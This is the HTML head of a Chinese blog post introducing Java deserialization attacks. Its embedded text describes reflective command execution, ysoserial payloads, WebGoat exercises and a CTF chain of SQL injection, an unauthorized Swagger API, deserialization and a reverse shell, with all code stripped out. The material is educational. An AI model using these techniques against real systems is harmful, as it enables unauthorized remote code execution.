<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Java反序列化1入门 | hybcx</title><meta name="keywords" content="Java反序列化"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Java反序列化1入门"><meta name="application-name" content="Java反序列化1入门"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Java反序列化1入门"><meta property="og:url" content="http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 如今CTF比赛中难题或者是压轴题都涉及到Java知识，可见Java安全的火爆程度，如今看了小迪的涉及到Java反序列化1的课程，也想着是时候初步学习一下了。故此文章用来入门Java反序列化1，后续遇到新知识在写吧。 0x02 Java反射 跟着师傅的路线先了解一下Java反射 Jav"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 如今CTF比赛中难题或者是压轴题都涉及到Java知识，可见Java安全的火爆程度，如今看了小迪的涉及到Java反序列化1的课程，也想着是时候初步学习一下了。故此文章用来入门Java反序列化1，后续遇到新知识在写吧。 0x02 Java反射 跟着师傅的路线先了解一下Java反射 Jav"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'Java反序列化1入门',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 Java反射, Java正射, Java反射机制, Java 反射组成相关的类, 获取Class对象, 反射常用函数, 通过反射创建类对象, newInstance(), getMethod(), Invoke(), 反射java.lang.Runtime, Java反射到命令执行, Demo 1, Demo 2, getMethod, getDeclaredConstructor, getConstructor和getDeclaredConstructor, 反射调用类方法, 反射调用成员变量, 0x02 什么是Java序列化与反序列化, 0x03 漏洞成因, 3.1 可能的形式, 3.2 JAVA原生反序列化漏洞成因, 0x04 Java反序列化基础, 4.1 如何序列化类, 4.2 如何反序列化类, 4.3 serialVersionUID, 0x08 Java反序列化1实践, 8.1 序列化和反序列化过程, 8.2 ysoserial工具使用, webgoat-Insecure Deserialization, 8.3 SerializationDumper 数据分析, 8.4 [网鼎杯 2020 朱雀组]ThinkJava, jdbc sql 注入, ysoserial, 0x09 参考文章前言如今比赛中难题或者是压轴题都涉及到知识可见安全的火爆程度如今看了小迪的涉及到反序列化的课程也想着是时候初步学习一下了故此文章用来入门反序列化后续遇到新知识在写吧反射跟着师傅的路线先了解一下反射正射例子这是一个类有成员变量以及函数反射我们在编写代码时当需要使用到某一个类的时候都会先了解这个类是做什么的然后实例化这个类接着用实例化好的对象进行操作这就是正射反射反射正射小明类的对象作用是运行时提供或获得某个对象的类型信息反射机制反射是非常重要的动态特性通过使用反射我们不仅可以获取到任何类的成员方法成员变量构造方法等信息还可以动态创建类实例调用任意的类方法修改任意的类成员变量值等反射机制是语言的动态性的重要体现也是的各种框架底层实现的灵魂反射组成相关的类反射机制相关操作一般位于包中而反射机制组成需要重点注意以下的类类对象类的构造器对象类的属性对象类的方法对象反射调用方法获取类的方法实例化类对象的方法获取函数的方法执行函数的方法获取对象类是描述类的类作用是运行时提供或获得某个对象的类型信息获取类的实例有以下的三种方法方法一实例化对象的方法如果上下中存在某个类的实例那么我们可以通过来获取它的类方法二使用类的方法如果你已经加载了某个类只是想获取到它的对象那么就直接拿它的属性即可这个法其实不属于反射方法三动态加载类如果你知道某个类的名字想获取到这个类就可以使来获取我们可以写个简单的示例代码分别利用这三种方法获取当前类对象的当前类名此外还有一种获取类的方法反射反射类的属性实例化对象的方法动态加载类反射我们一般使用第三种通过方法去动态加载类且使用就不需要导入其他类可以加载我们任意的类而使用类属性需要导入类的包依赖性太强在大型项目中容易抛出编译错误而使用实例化对象的方法需要本身创建一个对象本身就没有了使用反射机制意义所以我们在获取对象中一般使用方法去获取反射常用函数方法获取的是当前类中所有公共方法包括从父类里继承来的方法系列方法获取的是当前类中声明的方法包括和不包含从父类继承来的方法方法获取的是当前类声明为公共构造函数实例方法获取的是当前类声明的构造函数实例包括和在获取到私有方法或构造方法后使用改变其作用域这样即使是私有的属性方法构造函数也都可以访问调用了将获取到的对象实例化调用的是这个类的无参构造函数使用不成功的话可能是因为你使用的类没有无参构造函数你使用的类构造函数是私有的调用包装在当前对象中的方法通过反射创建类对象通过反射创建类对象主要有两种方式通过对象的方法通过对象的方法第一种通过对象的方法第二种通过对象的方法通过对象创建类对象可以选择特定构造方法而通过对象则只能使用默认的无参数构造方法下面的代码就调用了一个有参数的构造方法进行了类对象的初始化红富士该方法属于类执行后返回一个可以利用这个方法来实例化对应的类作用就是调用这个类的无参构造函数但要求要实例化的类必须要有无参构造函数并且这个构造函数不是私有的类的分析进入类中可以看到这里可以看到类为单例模式这意味着我们只能通过方法来获取对象同时注意对象是静态方法即可以直接通过类名方法名的方法调用执行命令获取对象执行命令弹出计算器该方法可获取一个对象即获取类中的方法通常要和方法一起使用这里重点关注下它的各项参数第一个参数是所要获取方法的方法名第二个参数是所获得的方法中参数的类型是个类型的数组用的是的可变长参数的写法是泛型的表示这里不探讨即参数类型其实等价于传递的对应参数是所获取方法的对应的参数类型比如中的函数获取它就是方法用于执行获取的方法看看它的相关参数第一个参数是函数所在的类对象第二个是所执行的函数的对象参数依旧拿方法来说获取对象执行函数如果执行的方法是静态方法那么的第一个参数将被忽略比如我们要执行上面所说的类中的静态方法去获取对象调用静态方法获取对象调用的是静态方法里参数随便写一个就行会忽略第一个参数等价于反射因为有一个方法可以执行本地命令所以在很多的中我们都能看到反射调用类来执行本地系统命令通过学习如何反射类也能让我们理解反射的一些基础用法不使用反射执行本地命令代码片段输出命令执行结果如上可以看到我们可以使用一行代码完成本地命令执行操作但是如果使用反射就会比较麻烦了我们不得不需要间接性的调用的方法反射执行本地命令代码片段获取类对象获取构造方法创建类示例等价于获取的方法调用方法等价于获取命令执行结果输出命令执行结果反射调用实现本地命令执行的流程如下反射获取类对象使用类的对象获取类的无参数构造方法因为的构造方法是的我们无法直接调用所以我们需要通过反射去修改方法的访问权限获取类的方法调用方法上面的代码每一步都写了非常清晰的注释接下来我们将进一步深入的了解下每一步具体含义反射到命令执行学习反射机制其实我们更关心如何利用反射实现命令执行下面是反射命令执行的几种情况反射反射反射反射假设参数可控我们使用来弹计算器可以看到在类中定义了一个实例化函数块静态初始化块以及构造函数在类中则是定义了一个函数来调用函数在函数中对传入的参数会用函数去加载并初始化对应的类而在这里也就是反射类而加载该类之后回去调用类中对应的静态初始化块函数也就是上述执行代码最终弹出计算器而这里呢如果我们对可控那就可以构造恶意类进行攻击了下面是两种通过反射来达到命令执行的方式由于类的构造函数是私有的因此不能直接使用创建一个实例那为什么这个类的构造函数会是私有的呢这涉及到一个单例模式的概念单例模式的目的是为了保证在一个进程中某个类有且仅有一个实例因为这个类只有一个实例因此自然不能让调用方使用来创建实例了所以单例的构造方法必须是这样就防止了调用方自己创建实例但是在类的内部是可以用一个静态字段来引用唯一创建的实例的举个例子我们在链接数据库时只有最开始链接一次而不是用一次链接一次如果这样的话资源消耗太大了因此可以将类的构造函数设为私有再通过静态方法来获取由于使用了单例模式我们可以通过来获取对象有两种方法进行反射命令执行这里由于我们无法直接实例化类因此只能靠反射机制首先定义了一个对象然后通过方法获取到了类的对象也就是能得到类中的数据及方法随后利用方法调用了即类中的方法为后续命令执行做准备然后又通过获取到类中的方法接着通过进行调用该方法执行也就是执行成功获取到类的对象并赋值给实例最终用方法调用了实例的方法并传入相应参数成功弹出计算器首先通过获取的类对象对象提供了关于类或接口的结构和行为的信息包括类的名称父类实现的接口字段方法等需要注意这里的对象并不能直接调用某种方法还需要利用反射机制才可之后利用函数获取到了类中的私有构造函数接着设置使得我们可以调用其私有构造函数接着利用的就可以实例化一个类对象了之后通过对象调用方法获取到类的方法最后利用执行弹出计算器注意这里我用的是如果是以上对于这种反射机制会爆出如下错误解决办法可参考但这里我就换了个低版本懒得解决了和这两个方法均用于获取类的构造方法后者可以获取私有的构造方法前面利用中的方法获取一个类对象只能是对应无参的构造函数来实例化类而利用这两个函数可以调用类的有参构造函数来实例化一个对象这里以为例用法相同只是后续要加个该方法的参数是获取到的构造方法中对应参数的数据类型该方法返回的对象中有个方法看看这个方法的参数方法的参数是调用的构造方法对应的参数比如我们利用类来执行命令注意这里用到的重载的构造方法等价于使用反射构造简单解释下这两个参数是类构造函数的参数类型参数也是可变长参数等价于即套两层数组上述用到了强制类型转换将上述改改用完全反射的方法写成一行和都可以获取到类构造方法区别在于后者无法获取到私有方法所以一般在获取某个类的构造方法时候我们会使用前者去获取构造方法如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组如如果我们想获取类的所有构造方法可以使用来获取一个数组获取到以后我们可以通过来创建类实例同理如果有参数的情况下我们应该传入对应的参数值如当我们没有访问构造方法权限时我们应该调用修改访问权限就可以成功的创建出类实例了反射调用类方法对象提供了一个获取某个类的所有的成员方法的方法也可以通过方法名和方法参数类型来获取指定成员方法获取当前类所有的成员方法获取当前类指定的成员方法方法名方法名参数类型如多个参数用号隔开和都能够获取到类成员方法区别在于只能获取到当前类和父类的所有有权限的方法如而能获取到当前类的所有成员方法不包含父类反射调用方法获取到对象以后我们可以通过的方法来调用类方法调用类方法代码片段方法实例对象方法参数值多个参数值用隔开的第一个参数必须是类实例对象如果调用的是方法那么第一个参数值可以传因为在中调用静态方法是不需要有类实例的因为可以直接类名方法名参数的方式调用的第二个参数不是必须的如果当前调用的方法没有参数那么第二个参数可以不传如果有参数那么就必须严格的依次传入对应的参数类型反射调用成员变量反射不但可以获取类所有的成员变量名称还可以无视权限修饰符实现修改对应的值获取当前类的所有成员变量获取当前类指定的成员变量变量名和的区别同和获取成员变量值类实例对象修改成员变量值类实例对象修改后的值同理当我们没有修改的成员变量权限时可以使用的方式修改为访问成员变量访问权限如果我们需要修改被关键字修饰的成员变量那么我们需要先修改方法反射获取类的设置修改权限修改成员变量的对象的值修改成员变量值类实例对象修改后的值什么是序列化与反序列化在编程语言的世界当中常常有这样的需求我们需要将本地已经实例化的某个对象通过网络传递到其他机器当中为了满足这种需求就有了所谓的序列化和反序列化序列化将对象压缩成字节序列或字节流的形式反序列化将字节序列或字节流转化成对象对象的序列化主要有两种用途把对象的字节序列永久地保存到硬盘上通常存放在一个文件中持久化对象在网络上传送对象的字节序列网络传输对象漏洞成因只要服务端反序列化数据客户端传递类的中代码会自动执行给予攻击者在服务器上运行代码的能力可能的形式入口类的直接调用危险方法入口类参数中包含可控类该类有危险方法时调用入口类参数中包含可控类该类又调用其他有危险方法的类时调用比如类型定义为调用相同类型同名函数构造函数静态代码块等类加载时隐式执行原生反序列化漏洞成因中间件通常通过网络接收客户端发送的序列化数据而在服务端对序列化数据进行反序列化时会调用被序列化对象的方法而在中如果重写了某个类的方法就会优先调用经过修改后的方法如果某个对象重写了方法且在方法中能够执行任意代码那服务端在进行反序列化时也会执行相应代码简单来说攻击者通过构造恶意输入让反序列化产生非预期的对象在此过程中执行构造的恶意代码反序列化基础不同于序列化是将对象转换成了字符串序列化是将对象转换为了字节流且序列化与反序列化是一种思想并不局限于其实现形式如内置的内置的出现过漏洞的组件看一下中执行系统命令的方法中执行系统命令使用类的方法以上函数可以弹出计算器是类中的静态方法使用此方法获取当前程序的即运行时计算机程序运行需要的代码库框架平台等底层为此类用于创建操作系统进程每个实例管理进程属性的集合方法使用这些属性创建一个新的实例方法可以从同一实例重复调用以创建具有相同或相关属性的新子进程注意这里的命令执行并不是使用系统中的或是进行的系统命令执行而是使用本身所以反弹的重定向符在中并不支持我们来细分一下上述执行命令的步骤那么相应的反射的代码如下方法名方法类型某个对象实例传入参数这里第一句的作用等价于目的是获取一个对象实例好被下一个调用第二句的作用就是调用上一步生成的实例的方法并将参数传入方法接下来编写反序列化过程在当中如果一个类需要被序列化和反序列化需要实现接口类的方法将对象序列化成字符串数据类的方法将字符串数据反序列化成对象要序列化的数据序列化反序列化我们用编辑器打开上述生成的文件看看可见上述十六进制是以开头的这里说一下序列化特性一段数据以开头你基本可以确定这串就是序列化加密的数据或者如果以开头那么他就是这一段序列化的进制且为对象序列化的版本号要序列化的数据序列化反序列化这里如果我们直接运行会发现报错但计算器是成功弹出的这是因为上述类没有继承接口所以导致不会成功它弹是在写的时候弹出来的我们如果跟进接口会发现如下图是一个空类有位师傅这样解释这说明起作用只是为了在反序列化和序列化中做一个类型判断为什么呢因为遵循非必要原则不需要反序列化的类就可以不用反序列化了如何序列化类原生实现了一套序列化的机制它让我们不需要额外编写代码只需要实现接口并调用类的方法即可类实现序列化的前提需要实现这个接口表示这个类的成员可以被序列化添加一个关键字则属性不会被序列化和反序列化如果将属性设置为同样不会被序列化和反序列化是的元数据自动加上去的一个标志告诉你说下面这个方法是从父类接口继承过来的需要你重写一次这样就可以方便你阅读也不怕会忘记是伪代码表示重写当然不写也可以不过写上有如下好处可以当注释用方便阅读编译器可以给你验证下面的方法名是否是你父类中所有的如果没有则报错比如你如果没写而你下面的方法名又写错了这时你的编译器是可以通过的它以为这个方法是你的子类中自己增加的方法使用该标记是为了增强程序在编译时候的检查如果该方法并不是一个覆盖父类的方法在编译时编译器就会报告错误方法用于从这个读取当前类的非静态和非瞬态字段它间接地涉及到该类的方法的帮助如果它被调用则会抛出每个应用程序都有一个类的允许应用程序与运行应用程序的环境进行接口当前运行时可以从方法获得在具有指定环境的单独进程中执行指定的字符串命令类实现将对象的原始数据类型和图形写入可以使用读取重构对象可以通过使用流的文件来实现对象的持久存储如果流是网络套接字流则可以在另一个主机上或另一个进程中重构对象文件输出流是用于将数据写入到输出流或一个文件是否可用或可能被创建取决于底层平台特别是某些平台允许一次只能打开一个文件来写入一个或其他文件写入对象在这种情况下如果所涉及的文件已经打开则此类中的构造函数将失败用于写入诸如图像数据的原始字节流对于写入字符流请考虑使用序列化的类方法用于将一个对象写入流中任何对象包括字符串和数组都是用编写的多个对象或原语可以写入流必须从对应的读取对象其类型和写入次序相同需要序列化的对象是谁跟进函数阅读其注释可知在反序列化的过程当中是针对对象本身而非针对类的因为静态属性是不参与序列化和反序列化的过程的另外如果属性本身声明了关键字也会被忽略但是如果某对象继承了类那么类当中的对象的对象属性也是会被序列化和反序列化的前提是类也实现了接口如何反序列化类序列化使用类反序列化使用的则是类的方法我们在之前重写了方法所以会执行命令类实现反序列化先前使用编写的原始数据和对象和可以分别为与和一起使用的对象图提供持久性存储的应用程序用于恢复先前序列化的对象其他用途包括使用套接字流在主机之间传递对象或者在远程通信系统中进行封送和解组参数和参数确保从流中创建的图中的所有对象的类型与虚拟机中存在的类匹配根据需要使用标准机制加载类只能从流中读取支持或接口的对象反序列化的类方法用于从流中读取对象应使用的安全铸造来获得所需的类型在中字符串和数组是对象在序列化过程中被视为对象读取时需要将其转换为预期类型读出来并反序列化其实反序列化的实现就是序列化的逆过程会根据序列化读出数据的类型进行相应的处理序列化和反序列化可以理解为压缩和解压缩但是压缩之所以能被解压缩的前提是因为他俩的协议是一样的如果压缩是以四个字节为一个单位而解压缩以八个字节为一个单位就会乱套同样在中与协议相对的概念为当不一致时反序列化会直接抛出异常比如设置为时序列化修改为时反序列化则会抛出异常如上图这里我们修改为如下图发生报错我们跟进上图报错第二行的那一行发现下图情况代码进行了判断如果两次不相同则抛出异常反序列化实践学了上述那么多前置知识但我发现那些文章还有大把没讲完太多了需要慢慢啃这里我就先复现一下看小迪课程的一些例子吧序列化和反序列化过程首先他这里给了一个简单序列化和反序列化代码类实现定义类用于后续序列化实例对象继承类类实现对象序列化男将对象的原始数据写入到可使用读取最后将数据写入到输出流将实例对象进行序列化对象序列化成功对象反序列化恢复先前序列化的对象反序列化数据流也就是先前实力对象的序列化字节流对象反序列化成功我们运行之后如下图同样的开头工具使用看了有几篇文章利用该工具的包进行一些常见反序列化漏洞的链子分析但对于看代码有些许困难的我还是先学会如何在实战中使用吧项目地址唉要是这个项目持续更新就好了这里的练习就用漏洞靶场来玩玩不过搭建了半天这新版本不会启动还是建议用的版本吧找到相应关卡这里让我们更改序列化数据让页面响应延迟秒即可成功那我们先可以验证一下这里是否存在反序列化注入点在此之前我们观察到上述序列化对象时开头这说明是序列化数据经过加密的结果这里我们可以看一下源码进行验证我们在上述输入提交抓一下包看一下对应的实现接口如上图我们可以发现接口地址为我们到其项目中找一下如上图我们可以看到该类在处理传入的参数时进行了的解密这意味着我们如果构造了序列化恶意数据之后还需要进行的加密这里我们用一下工具在这里作用大概就是可以凭借右侧依赖对应的反序列化漏洞点直接根据用户输入的恶意数据生成依赖所对应的反序列化漏洞的序列化数据这里我们用到的是上述命令我们利用平台回显来判断是否存在反序列化漏洞执行完后我们打开发现是开头编码一下这里不知为何那些平台都崩了打不开因此用了自带的进行了验证点击上述复制后输入相关命令最后将得到的文件数据进行一次加密输出将得到的数据输入至下列输入框中最后看到上图的中显示了最近一次的访问验证成功接下来利用执行系统命令来验证一次这里的我们可以看一下这里如上图可以看到这里是支持的因此我们需要在的包中找到相关的如上图我们找到了一般都是找这个包的这是插件的核心如图执行成功后我们打开看一下如下图可以看到是以开头的接下来用个脚本编码一下这里编译好直接输入至输入框中即可但这里不知道为何我弹不出计算器这里先尝试延迟秒吧这里由于是环境就是来实现这里可以看到程序对传入的进行了的解码并用做了一定过滤接着送入进行反序列化如果反序列化的对象不是类的话就会抛出错误接着最后判断的大小我们需要控制在秒内我们转到类的实现如下列代码这里代码中重写了函数并且通过条件语句限制了只能使用或在与环境下实现延迟效果最后通过来触发命令执行里面提供了一些工具类接下来就是构造反序列化的我们在源码中所在的目录下新建一个类其中的内容写我们需要的恶意代码如下图所示向类传入命令创建一个对象用于存储序列化后的字节数据创建一个对象用于将对象序列化到进行反序列化刷新确保所有数据都被写入到获取中的字节数组将字节数组进行编码得到一个编码的字符串代码内容如上图执行后生成复制到处提交从可以看到执行了命令且任务的响应也会变慢如上图成功通过然后我在解决上述问题的时候突然看到这个的版本适配的是然后我就下载了的来重新运行随后又尝试弹竟然成了这感觉就是纯纯版本适配问题啊还有一点我在使用的时一直连接不上去翻了多个文章发现是校园网的问题无语住了数据分析项目地址这个可以用来进行反序列化之类的数据分析如图所示可以较为清楚的展示反序列化数据网鼎杯朱雀组访问首页说没有身份权限那估计需要先一下这里先看题目给的附件为了开发方便对应数据库字典查询这里给了一个接口其中会访问接口接着传入了数据库的账号和密码我们转到看看这里看到用来查询数据库数据其中语句没做过滤存在注入但我们在中会看到如下图导入的包中含有我们百度查一下相关资料是一个规范和完整的框架用于生成描述调用和可视化风格的服务在金融机构开发语言的地位一直居高不下而作为届服务端的大一统框架便将规范纳入自身的标准建立了项目所以在实际测试环境中基于框架的接口展示及调试文档页面最为常见这里我们搜的时候会发现他会提示有个漏洞那我们继续了解一下会发现这玩意儿存在未授权访问漏洞这里也是看了要访问页面查看一番发现其有三个接口对应着题目附件中源码中的文件我们可以现在处进行注入拿到账号密码不过这里涉及到了的注入这里先跟着浅学一下一会儿深入我们定位到下图这里看师傅们说这里由于进行了的拼接那我们在进行注入的时候要满足协议的连接不能出错因此这里会用到类似的锚点这里做完在了解什么是锚点注入关于的使用在中表示锚点表示网页中的一个位置比如浏览器读取这个会将移到可视位置在第一个都会被视为位置标识符不会被发送到服务端而类似于解析所以会忽略后面的字符而又是注入中的注释符如果我们需要在中传那么需要进行编码为查看数据库这里是传参这里测试了几波发现需要将单引号和空格进行编码爆表名爆字段名爆用户名密码这样的话就拿到了用户账号和密码使用账号密码登录如上图登陆成功往下翻可以看到这里的部分存在开头的这很明显就是反序列化经过编码后的结果那我们验证一下这里是否存在反序列化漏洞如上图我们使用的是自带的插件如上图我们发现确实存在反序列化漏洞接下来使用打上述命令打完记得编码本来我们分析道会将用户的信息进行序列化并编码那我们就可以构造而已的序列化数据传给这样在解析的时候就会反序列化我们的恶意数据进而拿到等这里问了一下上述的含义这段命令使用工具进行请求并包含了一些参数和选项让我们逐步解释这个命令是一个命令行工具用于在和类系统中传输数据支持多种协议包括指定了要访问的其中是占位符你需要替换它为实际的目标这是的一个选项用于指定要发送的数据在这个例子中表示将文件中的数据作为请求的主体数据发送到指定的符号告诉从文件中读取数据总的来说这个命令的目的是通过请求将文件的内容发送到指定的替换为实际的目标在实际应用中请确保你了解并授权了发送数据的操作以免不当使用接着尝试一下反弹命令如下进行编码编码内容进行编码接着发送至接口即可如下图成功拿到这里我们用对用户登录成功的数据分析一下不过在此之前需要将上述转为进制这里依旧用个脚本我们进入文件会发现如下图中含有说明这里代码通过反序列化数据来判断其中的值是否为参考文章反序列化反序列化漏洞入门反序列化从入门到放弃浅显易懂的反序列化入门反射反射学习初探安全之反射反射基础学渗透靶场五不安全的序列化靶场之不安全的反序列化漏洞未授权访问漏洞网鼎杯朱雀组网鼎杯朱雀组网鼎杯朱雀组',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-04-23 20:46:57',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
